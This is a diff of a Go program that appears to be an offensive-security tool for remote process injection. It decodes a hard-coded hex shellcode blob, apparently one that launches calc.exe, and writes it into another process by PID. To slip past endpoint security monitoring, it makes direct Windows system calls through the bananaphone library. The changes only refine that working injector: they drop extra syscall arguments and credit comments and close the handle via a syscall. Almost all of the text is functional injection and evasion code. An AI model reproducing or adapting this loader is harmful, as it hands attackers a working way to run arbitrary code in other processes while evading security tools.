@@ -61,17 +61,14 @@ func setup(pid int) (uint16, uint16, uint16, uint16, uint16, uint16, int) {
 func inject(NtOpenProcess uint16, NtCreateThreadEx uint16, NtProtectVirtualMemory uint16, NtWriteVirtualMemory uint16, NtAllocateVirtualMemory uint16, ntClose uint16, pid int) {
 	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
 	if errShellcode != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
+		log.Fatalf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error())
 	}
 	var handle uintptr
-	// Thanks to this repo for throwing in an extra param as 0 to the func call. Stack alignment issues?
-	// https://github.com/timwhitez/Doge-Process-Injection/blob/main/NtCreateThreadEx/NtCreateThreadEx.go
 	ret, err := bananaphone.Syscall(NtOpenProcess,
 		uintptr(unsafe.Pointer(&handle)),
 		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
 		uintptr(unsafe.Pointer(&objectAttrs{})),
 		uintptr(unsafe.Pointer(&clientId{UniqueProcess: uintptr(pid)})),
-		0,
 	)
 	if err != nil {
 		fmt.Printf("[-] Failed to open process. Return code is %x\n", ret)
@@ -92,15 +89,12 @@ func inject(NtOpenProcess uint16, NtCreateThreadEx uint16, NtProtectVirtualMemor
 		return
 	}
 	var numberBytesWritten uintptr
-	// Again credit to this guy and his extra param of 0
-	// https://github.com/timwhitez/Doge-Process-Injection/blob/main/NtCreateThreadEx/NtCreateThreadEx.go
 	ret, err = bananaphone.Syscall(NtWriteVirtualMemory,
 		handle,
 		bAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		regionSize,
 		uintptr(unsafe.Pointer(&numberBytesWritten)),
-		0,
 	)
 
 	if err != nil {
@@ -138,11 +132,10 @@ func inject(NtOpenProcess uint16, NtCreateThreadEx uint16, NtProtectVirtualMemor
 		fmt.Printf("[-] Failed to create thread. Return code is %x\n", ret)
 		return
 	}
-	// issues with ntClose
-	errCloseHandle := windows.CloseHandle(windows.Handle(handle))
-	if errCloseHandle != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
-	}
+
+	ret, err = bananaphone.Syscall(ntClose,
+		handle,
+	)
 
 	if err != nil {
 		fmt.Printf("[-] Failed to close handle. Return code is %x\n", ret)
